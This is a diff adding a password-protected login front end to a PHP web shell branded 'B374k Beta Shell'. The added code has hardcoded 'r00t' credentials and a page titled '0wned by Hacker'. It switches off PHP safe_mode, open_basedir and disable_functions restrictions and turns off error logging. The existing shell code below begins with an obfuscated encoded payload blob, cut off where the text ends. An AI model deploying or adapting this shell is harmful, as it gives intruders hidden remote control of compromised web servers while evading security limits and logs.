@@ -1,8 +1,247 @@
+<?
+// ###########################################
+// #           B374k Beta ShElL V1           #
+// #            Cyb3R_ShubhaM                #
+// #          www.CyberShubham.com           #
+// ###########################################
+
+//Change User & Password
+
+$tacfgd['uname'] = 'r00t';
+$tacfgd['pword'] = 'r00t';
+
+
+// Title of page.
+$tacfgd['title'] = '0wned by Hacker';
+
+// Text to appear just above login form.
+$tacfgd['helptext'] = 'B374k Beta';
+
+
+// Set to true to enable the optional remember-me feature, which stores encrypted login details to 
+// allow users to be logged-in automatically on their return. Turn off for a little extra security.
+$tacfgd['allowrm'] = true;
+
+// If you have multiple protected pages, and there's more than one username / password combination, 
+// you need to group each combination under a distinct rmgroup so that the remember-me feature 
+// knows which login details to use.
+$tacfgd['rmgroup'] = 'default';
+
+// Set to true if you use your own sessions within your protected page, to stop txtAuth interfering. 
+// In this case, you _must_ call session_start() before you require() txtAuth. Logging out will not 
+// destroy the session, so that is left up to you.
+$tacfgd['ownsessions'] = false;
+
+
+
+
+foreach ($tacfgd as $key => $val) {
+  if (!isset($tacfg[$key])) $tacfg[$key] = $val;
+}
+
+if (!$tacfg['ownsessions']) {
+  session_name('txtauth');
+  session_start();
+}
+
+// Logout attempt made. Deletes any remember-me cookie as well
+if (isset($_GET['logout']) || isset($_POST['logout'])) {
+  setcookie('txtauth_'.$rmgroup, '', time()-86400*14);
+  if (!$tacfg['ownsessions']) {
+    $_SESSION = array();
+    session_destroy();
+  }
+  else $_SESSION['txtauthin'] = false;
+}
+// Login attempt made
+elseif (isset($_POST['login'])) {
+  if ($_POST['uname'] == $tacfg['uname'] && $_POST['pword'] == $tacfg['pword']) {
+    $_SESSION['txtauthin'] = true;
+    if ($_POST['rm']) {
+      // Set remember-me cookie for 2 weeks
+      setcookie('txtauth_'.$rmgroup, md5($tacfg['uname'].$tacfg['pword']), time()+86400*14);
+    }
+  }
+  else $err = 'Login Faild !';
+}
+// Remember-me cookie exists
+elseif (isset($_COOKIE['txtauth_'.$rmgroup])) {
+  if (md5($tacfg['uname'].$tacfg['pword']) == $_COOKIE['txtauth_'.$rmgroup] && $tacfg['allowrm']) {
+    $_SESSION['txtauthin'] = true;
+  }
+  else $err = 'Login Faild !';
+}
+if (!$_SESSION['txtauthin']) {
+@ini_restore("safe_mode");
+@ini_restore("open_basedir");
+@ini_restore("safe_mode_include_dir");
+@ini_restore("safe_mode_exec_dir");
+@ini_restore("disable_functions");
+@ini_restore("allow_url_fopen");
+
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+?>
+<html dir=rtl>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1256">
+<title><?=$tacfg['title']?></title>
+
+<STYLE>
+
+BODY
+ {
+        SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; COLOR: #666666; SCROLLBAR-3DLIGHT-COLOR: #726456; SCROLLBAR-ARROW-COLOR: #726456; SCROLLBAR-TRACK-COLOR: #292929; FONT-FAMILY: Verdana; SCROLLBAR-DARKSHADOW-COLOR: #726456
+}
+
+tr {
+BORDER-RIGHT:  #dadada ;
+BORDER-TOP:    #dadada ;
+BORDER-LEFT:   #dadada ;
+BORDER-BOTTOM: #dadada ;
+color: #ffffff;
+}
+td {
+BORDER-RIGHT:  #dadada ;
+BORDER-TOP:    #dadada ;
+BORDER-LEFT:   #dadada ;
+BORDER-BOTTOM: #dadada ;
+color: #dadada;
+}
+.table1 {
+BORDER: 1;
+BACKGROUND-COLOR: #000000;
+color: #333333;
+}
+.td1 {
+BORDER: 1;
+font: 7pt tahoma;
+color: #ffffff;
+}
+.tr1 {
+BORDER: 1;
+color: #dadada;
+}
+table {
+BORDER:  #eeeeee  outset;
+BACKGROUND-COLOR: #000000;
+color: #dadada;
+}
+input {
+BORDER-RIGHT:  #00FF00 1 solid;
+BORDER-TOP:    #00FF00 1 solid;
+BORDER-LEFT:  #00FF00 1 solid;
+BORDER-BOTTOM: #00FF00 1 solid;
+BACKGROUND-COLOR: #333333;
+font: 9pt tahoma;
+color: #ffffff;
+}
+select {
+BORDER-RIGHT:  #ffffff 1 solid;
+BORDER-TOP:    #999999 1 solid;
+BORDER-LEFT:   #999999 1 solid;
+BORDER-BOTTOM: #ffffff 1 solid;
+BACKGROUND-COLOR: #000000;
+font: 9pt tahoma;
+color: #dadada;;
+}
+submit {
+BORDER:  buttonhighlight 1 outset;
+BACKGROUND-COLOR: #272727;
+width: 40%;
+color: #dadada;
+}
+textarea {
+BORDER-RIGHT:  #ffffff 1 solid;
+BORDER-TOP:    #999999 1 solid;
+BORDER-LEFT:   #999999 1 solid;
+BORDER-BOTTOM: #ffffff 1 solid;
+BACKGROUND-COLOR: #333333;
+font: Fixedsys bold;
+color: #ffffff;
+}
+BODY {
+margin: 1;
+color: #dadada;
+background-color: #000000;
+}
+A:link {COLOR:red; TEXT-DECORATION: none}
+A:visited { COLOR:red; TEXT-DECORATION: none}
+A:active {COLOR:red; TEXT-DECORATION: none}
+A:hover {color:blue;TEXT-DECORATION: none}
+
+</STYLE>
+<script language=\'javascript\'>
+function hide_div(id)
+{
+  document.getElementById(id).style.display = \'none\';
+  document.cookie=id+\'=0;\';
+}
+function show_div(id)
+{
+  document.getElementById(id).style.display = \'block\';
+  document.cookie=id+\'=1;\';
+}
+function change_divst(id)
+{
+  if (document.getElementById(id).style.display == \'none\')
+    show_div(id);
+  else
+    hide_div(id);
+}
+</script>';
+
+<body>
+<br><br><div style="font-size: 14pt;" align="center"><?=$tacfg['title']?></div>
+<hr width="300" size="1" noshade color="#cdcdcd">
+<p>
+<div align="center" class="grey">
+<?=$tacfg['helptext']?>
+</div>
+<p>
+<?
+if (isset($_SERVER['REQUEST_URI'])) $action = $_SERVER['REQUEST_URI'];
+else $action = $_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
+if (strpos($action, 'logout=1', strpos($action, '?')) !== false) $action = str_replace('logout=1', '', $action);
+?>
+<form name="txtauth" action="<?=$action?>" method="post">
+<div align="center">
+<table border="0" cellpadding="4" cellspacing="0" bgcolor="#666666" style="border: 1px double #dedede;" dir="ltr">
+<?=(isset($err))?'<tr><td colspan="2" align="center"><font color="red">'.$err.'</font></td></tr>':''?>
+<?if (isset($tacfg['uname'])) {?>
+<tr><td>Username:</td><td><input type="text" name="uname" value="" size="20" maxlength="100" class="txtbox"></td></tr>
+<?}?>
+<tr><td>Password:</td><td><input type="password" name="pword" value="" size="20" maxlength="100" class="txtbox"></td></tr>
+<?if ($tacfg['allowrm']) {?>
+<tr><td align="left"><input type="submit" name="login" value="Login">
+</td><td align="right"><input type="checkbox" name="rm" id="rm"><label for="rm"> 
+	Remember Me ?</label></td></tr>
+<?} else {?>
+<tr><td colspan="2" align="center">
+	<input type="submit" name="login" value="Login"></td></tr>
+<?}?>
+</table>
+</div>
+</form>
+
+<br><br>
+<hr width="300" size="1" noshade color="#cdcdcd">
+<div class="smalltxt" align="center">Developed by
+	<a href="mailto:darkfire.batch@gmail.com">Cyb3R_ShubhaM</a> | copyright ©  
+	2010</div>
+
+</body>
+</html>
+<?
+  // Don't delete this!
+  exit();
+}
+?>
+
 <?php
 
 @error_reporting(0);
 @set_time_limit(0); 
-
 
 $code = "7T35W+u2sr+/73v/g+vLLaGErGwhkJ4QEghbIAkJcE4/rmM7sYk3bGc9r//702ix5cRhOT1t770
 t7QFbGo2k0WhmJI3G//s/ej+he57qJ9aeTqvtz+uKsf7LhvDjjwKfIPxwJIjixsZXYa2vG6pwJHC
